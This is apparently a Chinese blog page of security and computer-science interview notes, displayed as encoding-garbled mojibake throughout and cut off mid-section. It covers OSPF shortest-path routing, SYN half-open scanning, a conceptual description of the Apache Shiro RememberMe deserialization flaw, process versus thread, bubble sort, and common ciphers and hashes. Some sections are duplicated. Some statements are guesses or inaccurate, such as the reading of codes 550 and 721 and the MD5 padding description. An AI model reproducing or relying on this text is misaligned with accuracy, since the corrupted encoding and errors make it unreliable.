Firstï¼ŒOSPFï¼‰æ˜¯ä¸€ç§åŸºäºé“¾è·¯çŠ¶æ€çš„å†…éƒ¨ç½‘å…³åè®®ï¼ˆIGPï¼‰ï¼Œå¹¿æ³›åº”ç”¨äºå¤§å‹ä¼ä¸šç½‘ç»œå’Œäº’è”ç½‘æœåŠ¡æä¾›å•†ï¼ˆISPï¼‰ä¸­ã€‚OSPFåè®®çš„æ ¸å¿ƒä¹‹ä¸€æ˜¯SPFï¼ˆShortest Path Firstï¼‰ç®—æ³•ï¼Œå³æœ€çŸ­è·¯å¾„ä¼˜å…ˆç®—æ³•ã€‚SPFç®—æ³•åŸºäºDijkstraç®—æ³•ï¼Œç”¨äºè®¡ç®—ç½‘ç»œä¸­å„èŠ‚ç‚¹ä¹‹é—´çš„æœ€ä¼˜è·¯å¾„ã€‚</p><h3 id="OSPFç®—æ³•çš„åŸºæœ¬åŸç†"><a href="#OSPFç®—æ³•çš„åŸºæœ¬åŸç†" class="headerlink" title="OSPFç®—æ³•çš„åŸºæœ¬åŸç†"></a>OSPFç®—æ³•çš„åŸºæœ¬åŸç†</h3><p>SPFç®—æ³•æ˜¯ä¸€ç§ç”¨äºè§£å†³å›¾è®ºä¸­å•æºæœ€çŸ­è·¯å¾„é—®é¢˜çš„ç®—æ³•ï¼Œæœ€åˆç”±è·å…°è®¡ç®—æœºç§‘å­¦å®¶Edsger W. Dijkstraæå‡ºã€‚åœ¨OSPFä¸­ï¼ŒSPFç®—æ³•ç”¨äºè®¡ç®—è·¯ç”±å™¨åˆ°ç½‘ç»œä¸­å…¶ä»–èŠ‚ç‚¹çš„æœ€çŸ­è·¯å¾„ã€‚å…·ä½“æ¥è¯´ï¼Œæ¯ä¸ªè¿è¡ŒOSPFçš„è·¯ç”±å™¨éƒ½ä¼šç»´æŠ¤ä¸€ä¸ªé“¾è·¯çŠ¶æ€æ•°æ®åº“ï¼ˆLSDBï¼‰ï¼Œè¯¥æ•°æ®åº“ä¸­å­˜å‚¨äº†ç½‘ç»œä¸­æ‰€æœ‰è·¯ç”±å™¨çš„é“¾è·¯çŠ¶æ€ä¿¡æ¯ã€‚å½“LSDBæ›´æ–°å®Œæˆåï¼Œè·¯ç”±å™¨ä¼šè¿è¡ŒSPFç®—æ³•ï¼Œç”Ÿæˆä¸€æ£µä»¥è¯¥è·¯ç”±å™¨ä¸ºæ ¹çš„æœ€çŸ­è·¯å¾„æ ‘ï¼ˆShortest Path Tree, SPTï¼‰ï¼Œä»è€Œç¡®å®šæ•°æ®åŒ…è½¬å‘çš„æœ€ä½³è·¯å¾„ã€‚</p><p>SPFç®—æ³•çš„å®ç°æ­¥éª¤</p><ol><li><strong>åˆå§‹åŒ–</strong>ï¼šé€‰æ‹©ä¸€ä¸ªèµ·ç‚¹ï¼ˆé€šå¸¸æ˜¯è¿è¡ŒSPFç®—æ³•çš„è·¯ç”±å™¨æœ¬èº«ï¼‰ï¼Œå¹¶å°†èµ·ç‚¹çš„æœ€çŸ­è·¯å¾„è·ç¦»è®¾ä¸º0ã€‚å°†æ‰€æœ‰å…¶ä»–èŠ‚ç‚¹çš„æœ€çŸ­è·¯å¾„è·ç¦»è®¾ä¸ºæ— ç©·å¤§ã€‚åˆ›å»ºä¸€ä¸ªæœªå¤„ç†èŠ‚ç‚¹åˆ—è¡¨ï¼Œå°†æ‰€æœ‰èŠ‚ç‚¹åŠ å…¥è¯¥åˆ—è¡¨ã€‚</li><li><strong>é€‰æ‹©æœ€è¿‘èŠ‚ç‚¹</strong>ï¼šä»æœªå¤„ç†èŠ‚ç‚¹åˆ—è¡¨ä¸­é€‰æ‹©ä¸€ä¸ªè·ç¦»èµ·ç‚¹æœ€è¿‘çš„èŠ‚ç‚¹ï¼Œæ ‡è®°ä¸ºå·²å¤„ç†ã€‚å°†è¯¥èŠ‚ç‚¹ä»æœªå¤„ç†èŠ‚ç‚¹åˆ—è¡¨ä¸­ç§»é™¤ã€‚</li><li><strong>æ›´æ–°é‚»å±…èŠ‚ç‚¹çš„è·ç¦»</strong>ï¼šå¯¹äºå·²å¤„ç†èŠ‚ç‚¹çš„æ‰€æœ‰é‚»å±…èŠ‚ç‚¹ï¼Œè®¡ç®—ä»èµ·ç‚¹åˆ°è¿™äº›é‚»å±…èŠ‚ç‚¹çš„è·¯å¾„è·ç¦»ã€‚å¦‚æœæ–°è®¡ç®—çš„è·ç¦»å°äºå½“å‰è®°å½•çš„è·ç¦»ï¼Œåˆ™æ›´æ–°é‚»å±…èŠ‚ç‚¹çš„æœ€çŸ­è·¯å¾„è·ç¦»ï¼Œå¹¶è®°å½•å‰é©±èŠ‚ç‚¹ï¼ˆå³ä»èµ·ç‚¹åˆ°è¯¥é‚»å±…èŠ‚ç‚¹çš„ä¸Šä¸€ä¸ªèŠ‚ç‚¹ï¼‰ã€‚</li><li><strong>é‡å¤æ­¥éª¤2å’Œ3</strong>ï¼šé‡å¤ä¸Šè¿°æ­¥éª¤ï¼Œç›´åˆ°æ‰€æœ‰èŠ‚ç‚¹éƒ½è¢«æ ‡è®°ä¸ºå·²å¤„ç†ã€‚</li><li><strong>ç”Ÿæˆæœ€çŸ­è·¯å¾„æ ‘ï¼ˆSPTï¼‰</strong>ï¼šSPFç®—æ³•æ‰§è¡Œå®Œæ¯•åï¼Œä¼šç”Ÿæˆä¸€æ£µä»¥è¯¥è·¯ç”±å™¨ä¸ºæ ¹çš„æœ€çŸ­è·¯å¾„æ ‘ï¼ˆSPTï¼‰ã€‚SPTæè¿°äº†ä»è¯¥è·¯ç”±å™¨åˆ°ç½‘ç»œä¸­æ‰€æœ‰å…¶ä»–èŠ‚ç‚¹çš„æœ€ä¼˜è·¯å¾„ï¼Œè·¯ç”±å™¨æ ¹æ®SPTä¸­çš„ä¿¡æ¯æ›´æ–°å…¶è·¯ç”±è¡¨ï¼Œä»è€Œç¡®å®šæ•°æ®åŒ…è½¬å‘çš„æœ€ä½³è·¯ç”±ã€‚</li></ol><h3 id="åŠæ‰«æ"><a href="#åŠæ‰«æ" class="headerlink" title="åŠæ‰«æ"></a>åŠæ‰«æ</h3><p>åœ¨åŠæ‰«æä¸­ï¼Œä»…å‘é€SYNæ•°æ®æ®µï¼Œå¦‚æœåº”ç­”ä¸ºRSTï¼Œåˆ™ç«¯å£å¤„äºå…³é—­çŠ¶æ€ï¼Œè‹¥åº”ç­”ä¸ºSYN&#x2F;ACKï¼Œåˆ™ç«¯å£å¤„äºç›‘å¬çŠ¶æ€ã€‚ä¸è¿‡è¿™ç§æ–¹å¼éœ€è¦è¾ƒé«˜çš„æƒé™ï¼Œè€Œä¸”éƒ¨åˆ†é˜²ç«å¢™å·²ç»å¼€å§‹å¯¹è¿™ç§æ‰«ææ–¹å¼åšå¤„ç†ã€‚</p><p>ä¸ºä»€ä¹ˆåŠæ‰«æéœ€è¦è¾ƒé«˜æƒé™ï¼Ÿè®¿é—®åŸå§‹å¥—æ¥å­—ï¼šæ‰§è¡ŒåŠæ‰«æéœ€è¦ä½¿ç”¨åŸå§‹å¥—æ¥å­—ï¼ˆRaw Socketsï¼‰ï¼Œè¿™å…è®¸ç›´æ¥è®¿é—®å’Œæ§åˆ¶TCP&#x2F;IPåè®®æ ˆã€‚åŸå§‹å¥—æ¥å­—æä¾›äº†å¯¹ç½‘ç»œå±‚åè®®çš„åº•å±‚è®¿é—®ï¼Œä½¿å¾—å‘é€å’Œæ¥æ”¶æœªåŠ å·¥çš„IPæ•°æ®åŒ…æˆä¸ºå¯èƒ½ã€‚åœ¨å¤§å¤šæ•°æ“ä½œç³»ç»Ÿä¸­ï¼Œåªæœ‰å…·æœ‰è¶³å¤Ÿæƒé™ï¼ˆé€šå¸¸æ˜¯rootæˆ–ç®¡ç†å‘˜æƒé™ï¼‰çš„ç”¨æˆ·æ‰èƒ½åˆ›å»ºå’Œä½¿ç”¨åŸå§‹å¥—æ¥å­—ã€‚</p><h3 id="Shiroæ¼æ´ç‰¹å¾"><a href="#Shiroæ¼æ´ç‰¹å¾" class="headerlink" title="Shiroæ¼æ´ç‰¹å¾"></a>Shiroæ¼æ´ç‰¹å¾</h3><p>Apache Shiroæ˜¯ä¸€ä¸ªå¼ºå¤§ä¸”æ˜“äºä½¿ç”¨çš„Javaå®‰å…¨æ¡†æ¶ï¼Œæä¾›äº†è®¤è¯ã€æˆæƒã€åŠ å¯†å’Œä¼šè¯ç®¡ç†ã€‚Shiroçš„ä¸€ä¸ªè‘—åæ¼æ´æ˜¯ååºåˆ—åŒ–æ¼æ´ï¼Œè¿™å…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„åºåˆ—åŒ–æ•°æ®æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚<br>ååºåˆ—åŒ–ï¼šæ”»å‡»è€…åˆ©ç”¨Shiroçš„é»˜è®¤CookieRememberMeManagerï¼Œè¯¥ç®¡ç†å™¨ä½¿ç”¨Base64è§£ç ç„¶åååºåˆ—åŒ–RememberMe Cookieã€‚<br>æ¼æ´åˆ©ç”¨ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€æ¶æ„æ„é€ çš„RememberMe Cookieæ¥æ‰§è¡Œè¿œç¨‹ä»£ç ã€‚<br>æ¼æ´ç¼–å·ï¼šå¦‚CVE-2016-4437ã€‚<br>550, 721ï¼šè¿™äº›æ•°å­—å¯èƒ½æŒ‡çš„æ˜¯ç½‘ç»œåè®®æˆ–ç‰¹å®šç³»ç»Ÿçš„é”™è¯¯ä»£ç ã€‚ä¾‹å¦‚ï¼Œåœ¨SMTPï¼ˆé‚®ä»¶ä¼ è¾“åè®®ï¼‰ä¸­ï¼Œ550è¡¨ç¤ºâ€œè¯·æ±‚çš„æ“ä½œæœªå®Œæˆï¼Œé‚®ç®±ä¸å¯ç”¨â€ï¼›721å¯èƒ½æŒ‡çš„æ˜¯æ‹¨å·è®¿é—®ä¸­çš„ä¸€ä¸ªé”™è¯¯ä»£ç ï¼Œè¡¨ç¤ºâ€œç¡¬ä»¶æ•…éšœâ€ã€‚</p><h3 id="AESåŠ å¯†åŸç†"><a href="#AESåŠ å¯†åŸç†" class="headerlink" title="AESåŠ å¯†åŸç†"></a>AESåŠ å¯†åŸç†</h3><p>AESï¼ˆé«˜çº§åŠ å¯†æ ‡å‡†ï¼‰æ˜¯ä¸€ç§å¯¹ç§°å¯†é’¥åŠ å¯†æ ‡å‡†ï¼Œç”¨äºæ›¿ä»£æ—§çš„DESåŠ å¯†æ ‡å‡†ã€‚AESåŠ å¯†ä½¿ç”¨ç›¸åŒçš„å¯†é’¥è¿›è¡ŒåŠ å¯†å’Œè§£å¯†ã€‚</p><h3 id="è¿›ç¨‹å’Œçº¿ç¨‹çš„åŒºåˆ«"><a href="#è¿›ç¨‹å’Œçº¿ç¨‹çš„åŒºåˆ«" class="headerlink" title="è¿›ç¨‹å’Œçº¿ç¨‹çš„åŒºåˆ«"></a>è¿›ç¨‹å’Œçº¿ç¨‹çš„åŒºåˆ«</h3><p>è¿›ç¨‹ï¼ˆProcessï¼‰ï¼š</p><ul><li>è¿›ç¨‹æ˜¯æ“ä½œç³»ç»Ÿè¿›è¡Œèµ„æºåˆ†é…å’Œè°ƒåº¦çš„åŸºæœ¬å•ä½ã€‚</li><li>æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ç‹¬ç«‹çš„å†…å­˜ç©ºé—´ï¼Œè‡³å°‘åŒ…æ‹¬ä»£ç æ®µã€æ•°æ®æ®µå’Œå †æ ˆã€‚</li><li>è¿›ç¨‹é—´çš„é€šä¿¡ï¼ˆIPCï¼‰å¤æ‚ï¼Œå› ä¸ºå®ƒä»¬æœ‰ä¸åŒçš„å†…å­˜ç©ºé—´ï¼Œéœ€è¦ç‰¹å®šçš„æœºåˆ¶æ¥äº¤æ¢ä¿¡æ¯ï¼Œå¦‚ç®¡é“ã€æ¶ˆæ¯é˜Ÿåˆ—ã€å…±äº«å†…å­˜ç­‰ã€‚</li><li>è¿›ç¨‹çš„åˆ›å»ºå’Œé”€æ¯å¼€é”€è¾ƒå¤§ï¼Œå› ä¸ºæ¶‰åŠåˆ°èµ„æºçš„åˆ†é…å’Œå›æ”¶ã€‚<br>çº¿ç¨‹ï¼ˆThreadï¼‰ï¼š</li><li>çº¿ç¨‹æ˜¯è¿›ç¨‹ä¸­çš„ä¸€ä¸ªæ‰§è¡Œæµï¼Œæ˜¯CPUè°ƒåº¦å’Œæ‰§è¡Œçš„åŸºæœ¬å•ä½ã€‚</li><li>çº¿ç¨‹å…±äº«è¿›ç¨‹çš„å†…å­˜ç©ºé—´ï¼ŒåŒ…æ‹¬ä»£ç æ®µã€æ•°æ®æ®µå’Œå †ï¼Œä½†æ¯ä¸ªçº¿ç¨‹æœ‰è‡ªå·±çš„å †æ ˆã€‚</li><li>çº¿ç¨‹é—´çš„é€šä¿¡æ›´ç®€å•ï¼Œå› ä¸ºå®ƒä»¬å…±äº«åŒä¸€å†…å­˜ç©ºé—´ï¼Œå¯ä»¥ç›´æ¥è¯»å†™æ•°æ®ã€‚</li><li>çº¿ç¨‹çš„åˆ›å»ºå’Œé”€æ¯å¼€é”€è¾ƒå°ï¼Œå› ä¸ºå®ƒä»¬å…±äº«è¿›ç¨‹èµ„æºã€‚<br>åŒºåˆ«ï¼š</li><li>è¿›ç¨‹æ˜¯èµ„æºåˆ†é…çš„å•ä½ï¼Œçº¿ç¨‹æ˜¯CPUè°ƒåº¦çš„å•ä½ã€‚</li><li>è¿›ç¨‹æœ‰ç‹¬ç«‹çš„å†…å­˜ç©ºé—´ï¼Œçº¿ç¨‹å…±äº«å†…å­˜ç©ºé—´ã€‚</li><li>è¿›ç¨‹é—´é€šä¿¡å¤æ‚ï¼Œçº¿ç¨‹é—´é€šä¿¡ç®€å•ã€‚</li><li>è¿›ç¨‹åˆ›å»ºé”€æ¯å¼€é”€å¤§ï¼Œçº¿ç¨‹åˆ›å»ºé”€æ¯å¼€é”€å°ã€‚</li></ul><h3 id="ï¼ˆ2ï¼‰å†’æ³¡æ’åºåŸç†"><a href="#ï¼ˆ2ï¼‰å†’æ³¡æ’åºåŸç†" class="headerlink" title="ï¼ˆ2ï¼‰å†’æ³¡æ’åºåŸç†"></a>ï¼ˆ2ï¼‰å†’æ³¡æ’åºåŸç†</h3><p>å†’æ³¡æ’åºæ˜¯ä¸€ç§ç®€å•çš„æ’åºç®—æ³•ï¼Œå®ƒé‡å¤åœ°éå†è¦æ’åºçš„æ•°åˆ—ï¼Œä¸€æ¬¡æ¯”è¾ƒä¸¤ä¸ªå…ƒç´ ï¼Œå¦‚æœä»–ä»¬çš„é¡ºåºé”™è¯¯å°±æŠŠä»–ä»¬äº¤æ¢è¿‡æ¥ã€‚<br>åŸç†ï¼š</p><ul><li>æ¯”è¾ƒç›¸é‚»çš„å…ƒç´ ã€‚å¦‚æœç¬¬ä¸€ä¸ªæ¯”ç¬¬äºŒä¸ªå¤§ï¼Œå°±äº¤æ¢ä»–ä»¬ä¸¤ä¸ªã€‚</li><li>å¯¹æ¯ä¸€å¯¹ç›¸é‚»å…ƒç´ åšåŒæ ·çš„å·¥ä½œï¼Œä»å¼€å§‹ç¬¬ä¸€å¯¹åˆ°ç»“å°¾çš„æœ€åä¸€å¯¹ã€‚è¿™æ­¥åšå®Œåï¼Œæœ€åçš„å…ƒç´ ä¼šæ˜¯æœ€å¤§çš„æ•°ã€‚</li><li>é’ˆå¯¹æ‰€æœ‰çš„å…ƒç´ é‡å¤ä»¥ä¸Šçš„æ­¥éª¤ï¼Œé™¤äº†æœ€åä¸€ä¸ªã€‚</li><li>æŒç»­æ¯æ¬¡å¯¹è¶Šæ¥è¶Šå°‘çš„å…ƒç´ é‡å¤ä¸Šé¢çš„æ­¥éª¤ï¼Œç›´åˆ°æ²¡æœ‰ä»»ä½•ä¸€å¯¹æ•°å­—éœ€è¦æ¯”è¾ƒã€‚<br>ç‰¹ç‚¹ï¼š</li><li>å†’æ³¡æ’åºæ˜¯ç¨³å®šçš„æ’åºæ–¹æ³•ã€‚</li><li>å¹³å‡æ—¶é—´å¤æ‚åº¦å’Œæœ€å·®æ—¶é—´å¤æ‚åº¦ä¸ºO(n^2)ï¼Œæœ€å¥½æ—¶é—´å¤æ‚åº¦ä¸ºO(n)ã€‚</li><li>å†’æ³¡æ’åºåœ¨å®ç°ä¸Šå¾ˆç®€å•ï¼Œä½†æ•ˆç‡ä¸é«˜ã€‚</li></ul><h3 id="ï¼ˆ1ï¼‰è¿›ç¨‹å’Œçº¿ç¨‹çš„åŒºåˆ«"><a href="#ï¼ˆ1ï¼‰è¿›ç¨‹å’Œçº¿ç¨‹çš„åŒºåˆ«" class="headerlink" title="ï¼ˆ1ï¼‰è¿›ç¨‹å’Œçº¿ç¨‹çš„åŒºåˆ«"></a>ï¼ˆ1ï¼‰è¿›ç¨‹å’Œçº¿ç¨‹çš„åŒºåˆ«</h3><p><strong>è¿›ç¨‹ï¼ˆProcessï¼‰</strong>ï¼š</p><ul><li>è¿›ç¨‹æ˜¯æ“ä½œç³»ç»Ÿè¿›è¡Œèµ„æºåˆ†é…å’Œè°ƒåº¦çš„åŸºæœ¬å•ä½ã€‚</li><li>æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ç‹¬ç«‹çš„å†…å­˜ç©ºé—´ï¼Œè‡³å°‘åŒ…æ‹¬ä»£ç æ®µã€æ•°æ®æ®µå’Œå †æ ˆã€‚</li><li>è¿›ç¨‹é—´çš„é€šä¿¡ï¼ˆIPCï¼‰å¤æ‚ï¼Œå› ä¸ºå®ƒä»¬æœ‰ä¸åŒçš„å†…å­˜ç©ºé—´ï¼Œéœ€è¦ç‰¹å®šçš„æœºåˆ¶æ¥äº¤æ¢ä¿¡æ¯ï¼Œå¦‚ç®¡é“ã€æ¶ˆæ¯é˜Ÿåˆ—ã€å…±äº«å†…å­˜ç­‰ã€‚</li><li>è¿›ç¨‹çš„åˆ›å»ºå’Œé”€æ¯å¼€é”€è¾ƒå¤§ï¼Œå› ä¸ºæ¶‰åŠåˆ°èµ„æºçš„åˆ†é…å’Œå›æ”¶ã€‚</li></ul><p><strong>çº¿ç¨‹ï¼ˆThreadï¼‰</strong>ï¼š</p><ul><li>çº¿ç¨‹æ˜¯è¿›ç¨‹ä¸­çš„ä¸€ä¸ªæ‰§è¡Œæµï¼Œæ˜¯CPUè°ƒåº¦å’Œæ‰§è¡Œçš„åŸºæœ¬å•ä½ã€‚</li><li>çº¿ç¨‹å…±äº«è¿›ç¨‹çš„å†…å­˜ç©ºé—´ï¼ŒåŒ…æ‹¬ä»£ç æ®µã€æ•°æ®æ®µå’Œå †ï¼Œä½†æ¯ä¸ªçº¿ç¨‹æœ‰è‡ªå·±çš„å †æ ˆã€‚</li><li>çº¿ç¨‹é—´çš„é€šä¿¡æ›´ç®€å•ï¼Œå› ä¸ºå®ƒä»¬å…±äº«åŒä¸€å†…å­˜ç©ºé—´ï¼Œå¯ä»¥ç›´æ¥è¯»å†™æ•°æ®ã€‚</li><li>çº¿ç¨‹çš„åˆ›å»ºå’Œé”€æ¯å¼€é”€è¾ƒå°ï¼Œå› ä¸ºå®ƒä»¬å…±äº«è¿›ç¨‹èµ„æºã€‚</li></ul><p><strong>åŒºåˆ«</strong>ï¼š</p><ul><li>è¿›ç¨‹æ˜¯èµ„æºåˆ†é…çš„å•ä½ï¼Œçº¿ç¨‹æ˜¯CPUè°ƒåº¦çš„å•ä½ã€‚</li><li>è¿›ç¨‹æœ‰ç‹¬ç«‹çš„å†…å­˜ç©ºé—´ï¼Œçº¿ç¨‹å…±äº«å†…å­˜ç©ºé—´ã€‚</li><li>è¿›ç¨‹é—´é€šä¿¡å¤æ‚ï¼Œçº¿ç¨‹é—´é€šä¿¡ç®€å•ã€‚</li><li>è¿›ç¨‹åˆ›å»ºé”€æ¯å¼€é”€å¤§ï¼Œçº¿ç¨‹åˆ›å»ºé”€æ¯å¼€é”€å°ã€‚</li></ul><h3 id="ï¼ˆ2ï¼‰å†’æ³¡æ’åºåŸç†-1"><a href="#ï¼ˆ2ï¼‰å†’æ³¡æ’åºåŸç†-1" class="headerlink" title="ï¼ˆ2ï¼‰å†’æ³¡æ’åºåŸç†"></a>ï¼ˆ2ï¼‰å†’æ³¡æ’åºåŸç†</h3><p>å†’æ³¡æ’åºæ˜¯ä¸€ç§ç®€å•çš„æ’åºç®—æ³•ï¼Œå®ƒé‡å¤åœ°éå†è¦æ’åºçš„æ•°åˆ—ï¼Œä¸€æ¬¡æ¯”è¾ƒä¸¤ä¸ªå…ƒç´ ï¼Œå¦‚æœä»–ä»¬çš„é¡ºåºé”™è¯¯å°±æŠŠä»–ä»¬äº¤æ¢è¿‡æ¥ã€‚</p><p><strong>åŸç†</strong>ï¼š</p><ol><li>æ¯”è¾ƒç›¸é‚»çš„å…ƒç´ ã€‚å¦‚æœç¬¬ä¸€ä¸ªæ¯”ç¬¬äºŒä¸ªå¤§ï¼Œå°±äº¤æ¢ä»–ä»¬ä¸¤ä¸ªã€‚</li><li>å¯¹æ¯ä¸€å¯¹ç›¸é‚»å…ƒç´ åšåŒæ ·çš„å·¥ä½œï¼Œä»å¼€å§‹ç¬¬ä¸€å¯¹åˆ°ç»“å°¾çš„æœ€åä¸€å¯¹ã€‚è¿™æ­¥åšå®Œåï¼Œæœ€åçš„å…ƒç´ ä¼šæ˜¯æœ€å¤§çš„æ•°ã€‚</li><li>é’ˆå¯¹æ‰€æœ‰çš„å…ƒç´ é‡å¤ä»¥ä¸Šçš„æ­¥éª¤ï¼Œé™¤äº†æœ€åä¸€ä¸ªã€‚</li><li>æŒç»­æ¯æ¬¡å¯¹è¶Šæ¥è¶Šå°‘çš„å…ƒç´ é‡å¤ä¸Šé¢çš„æ­¥éª¤ï¼Œç›´åˆ°æ²¡æœ‰ä»»ä½•ä¸€å¯¹æ•°å­—éœ€è¦æ¯”è¾ƒã€‚</li></ol><p><strong>ç‰¹ç‚¹</strong>ï¼š</p><ul><li>å†’æ³¡æ’åºæ˜¯ç¨³å®šçš„æ’åºæ–¹æ³•ã€‚</li><li>å¹³å‡æ—¶é—´å¤æ‚åº¦å’Œæœ€å·®æ—¶é—´å¤æ‚åº¦ä¸ºO(n^2)ï¼Œæœ€å¥½æ—¶é—´å¤æ‚åº¦ä¸ºO(n)ã€‚</li><li>å†’æ³¡æ’åºåœ¨å®ç°ä¸Šå¾ˆç®€å•ï¼Œä½†æ•ˆç‡ä¸é«˜ã€‚</li></ul><h3 id="ï¼ˆ6ï¼‰å¯¹ç§°åŠ å¯†ã€éå¯¹ç§°åŠ å¯†ä»¥åŠhashç®—æ³•ä¸¾ä¾‹åŠç®—æ³•æµç¨‹ç»†èŠ‚"><a href="#ï¼ˆ6ï¼‰å¯¹ç§°åŠ å¯†ã€éå¯¹ç§°åŠ å¯†ä»¥åŠhashç®—æ³•ä¸¾ä¾‹åŠç®—æ³•æµç¨‹ç»†èŠ‚" class="headerlink" title="ï¼ˆ6ï¼‰å¯¹ç§°åŠ å¯†ã€éå¯¹ç§°åŠ å¯†ä»¥åŠhashç®—æ³•ä¸¾ä¾‹åŠç®—æ³•æµç¨‹ç»†èŠ‚"></a>ï¼ˆ6ï¼‰å¯¹ç§°åŠ å¯†ã€éå¯¹ç§°åŠ å¯†ä»¥åŠhashç®—æ³•ä¸¾ä¾‹åŠç®—æ³•æµç¨‹ç»†èŠ‚</h3><p><strong>å¯¹ç§°åŠ å¯†</strong>ï¼š</p><ul><li><strong>AESï¼ˆé«˜çº§åŠ å¯†æ ‡å‡†ï¼‰</strong>ï¼š<ol><li>åˆå§‹åŒ–ï¼šé€‰æ‹©ä¸€ä¸ªå¯†é’¥å’Œä¸€ä¸ªåˆå§‹åŒ–å‘é‡ï¼ˆIVï¼‰ã€‚</li><li>åŠ å¯†ï¼šä½¿ç”¨å¯†é’¥å’ŒIVå¯¹æ•°æ®è¿›è¡ŒåŠ å¯†ã€‚</li><li>è§£å¯†ï¼šä½¿ç”¨ç›¸åŒçš„å¯†é’¥å’ŒIVå¯¹åŠ å¯†æ•°æ®è¿›è¡Œè§£å¯†ã€‚</li></ol></li><li><strong>DESï¼ˆæ•°æ®åŠ å¯†æ ‡å‡†ï¼‰</strong>ï¼š<ol><li>åˆå§‹åŒ–ï¼šé€‰æ‹©ä¸€ä¸ªå¯†é’¥ã€‚</li><li>åŠ å¯†ï¼šä½¿ç”¨å¯†é’¥å¯¹æ•°æ®è¿›è¡ŒåŠ å¯†ã€‚</li><li>è§£å¯†ï¼šä½¿ç”¨ç›¸åŒçš„å¯†é’¥å¯¹åŠ å¯†æ•°æ®è¿›è¡Œè§£å¯†ã€‚</li></ol></li></ul><p><strong>éå¯¹ç§°åŠ å¯†</strong>ï¼š</p><ul><li><strong>RSA</strong>ï¼š<ol><li>å¯†é’¥ç”Ÿæˆï¼šé€‰æ‹©ä¸¤ä¸ªå¤§ç´ æ•°på’Œqï¼Œè®¡ç®—n&#x3D;p<em>qï¼Œè®¡ç®—Ï†(n)&#x3D;(p-1)</em>(q-1)ï¼Œé€‰æ‹©ä¸€ä¸ªæ•´æ•°eï¼Œä½¿å¾—1&lt;e&lt;Ï†(n)ä¸”gcd(e,Ï†(n))&#x3D;1ï¼Œè®¡ç®—dï¼Œä½¿å¾—d*eâ‰¡1 (mod Ï†(n))ã€‚</li><li>åŠ å¯†ï¼šä½¿ç”¨å…¬é’¥(e, n)å¯¹æ•°æ®è¿›è¡ŒåŠ å¯†ï¼ŒC â‰¡ M^e (mod n)ã€‚</li><li>è§£å¯†ï¼šä½¿ç”¨ç§é’¥(d, n)å¯¹åŠ å¯†æ•°æ®è¿›è¡Œè§£å¯†ï¼ŒM â‰¡ C^d (mod n)ã€‚</li></ol></li><li><strong>ECCï¼ˆæ¤­åœ†æ›²çº¿å¯†ç å­¦ï¼‰</strong>ï¼š<ol><li>å¯†é’¥ç”Ÿæˆï¼šé€‰æ‹©ä¸€ä¸ªæ¤­åœ†æ›²çº¿å’Œä¸€ä¸ªåŸºç‚¹Gï¼Œç”Ÿæˆç§é’¥kï¼Œè®¡ç®—å…¬é’¥K&#x3D;kGã€‚</li><li>åŠ å¯†ï¼šä½¿ç”¨æ¥æ”¶æ–¹çš„å…¬é’¥Kå¯¹æ•°æ®è¿›è¡ŒåŠ å¯†ã€‚</li><li>è§£å¯†ï¼šä½¿ç”¨ç§é’¥kå¯¹åŠ å¯†æ•°æ®è¿›è¡Œè§£å¯†ã€‚</li></ol></li></ul><p><strong>Hashç®—æ³•</strong>ï¼š</p><ul><li><strong>SHA-256ï¼ˆå®‰å…¨å“ˆå¸Œç®—æ³•256ä½ï¼‰</strong>ï¼š<ol><li>é¢„å¤„ç†ï¼šå°†è¾“å…¥æ¶ˆæ¯å¡«å……åˆ°é•¿åº¦æ¨¡512ä½ç­‰äº448ä½ï¼Œç„¶åæ·»åŠ é•¿åº¦å€¼ã€‚</li><li>åˆå§‹åŒ–ï¼šè®¾ç½®åˆå§‹å“ˆå¸Œå€¼ã€‚</li><li>å¤„ç†æ¶ˆæ¯ï¼šå°†æ¶ˆæ¯åˆ†æˆ512ä½çš„å—ï¼Œå¯¹æ¯ä¸ªå—è¿›è¡Œå¤„ç†ã€‚</li><li>è¾“å‡ºï¼šè¾“å‡ºæœ€ç»ˆçš„å“ˆå¸Œå€¼ã€‚</li></ol></li><li><strong>MD5ï¼ˆæ¶ˆæ¯æ‘˜è¦ç®—æ³•5ï¼‰</strong>ï¼š<ol><li>é¢„å¤„ç†ï¼šå°†è¾“å…¥æ¶ˆæ¯å¡«å……åˆ°é•¿åº¦æ¨¡64ä½ç­‰äº56ä½ï¼Œç„¶åæ·»åŠ é•¿åº¦å€¼ã€‚</li><li>åˆå§‹åŒ–ï¼šè®¾ç½®åˆå§‹å“ˆå¸Œå€¼ã€‚</li><li>å¤„ç†æ¶ˆæ¯ï¼šå°†æ¶ˆæ¯åˆ†æˆ512ä½çš„å—ï¼Œå¯¹æ¯ä¸ªå—è¿›è¡Œå¤„ç†ã€‚</li><li>è¾“å‡ºï¼šè¾“å‡ºæœ€ç»ˆçš„å“ˆå¸Œå€¼ã€‚</li></ol></li></ul><h3 id="ï¼ˆ7ï¼‰SHA-1å’ŒSHA-2åŒºåˆ«"><a href="#ï¼ˆ7ï¼‰SHA-1å’ŒSHA-2åŒºåˆ«" class="headerlink" title="ï¼ˆ7ï¼‰SHA-1å’ŒSHA-2åŒºåˆ«"></a>ï¼ˆ7ï¼‰SHA-1å’ŒSHA-2åŒºåˆ«</h3><p><strong>SHA-1</strong>ï¼š</p><ul><li>è¾“å‡ºé•¿åº¦ï¼š160ä½ï¼ˆ20å­—èŠ‚ï¼‰ã€‚</li><li>å®‰å…¨æ€§ï¼šå·²è¢«è¯æ˜å­˜åœ¨å¼±ç‚¹ï¼Œå¯ä»¥è¢«ç¢°æ’æ”»å‡»ã€‚</li><li>é€Ÿåº¦ï¼šç›¸å¯¹è¾ƒå¿«ã€‚</li></ul><p><strong>SHA-2</strong>ï¼š</p><ul><li>è¾“å‡ºé•¿åº¦ï¼šå¯ä»¥æ˜¯224ä½ã€256ä½ã€384ä½æˆ–512ä½ã€‚</li><li>å®‰å…¨æ€§ï¼šç›®å‰è¢«è®¤ä¸ºæ˜¯å®‰å…¨çš„ï¼Œä½†éšç€è®¡ç®—èƒ½åŠ›çš„æé«˜ï¼Œå…¶å®‰å…¨æ€§å¯èƒ½ä¼šå—åˆ°æŒ‘æˆ˜ã€‚</li><li>é€Ÿåº¦ï¼šç›¸å¯¹è¾ƒæ…¢ï¼Œä½†æä¾›äº†æ›´é«˜çš„å®‰å…¨æ€§ã€‚</li></ul><p><strong>åŒºåˆ«</strong>ï¼š</p><ul><li><strong>è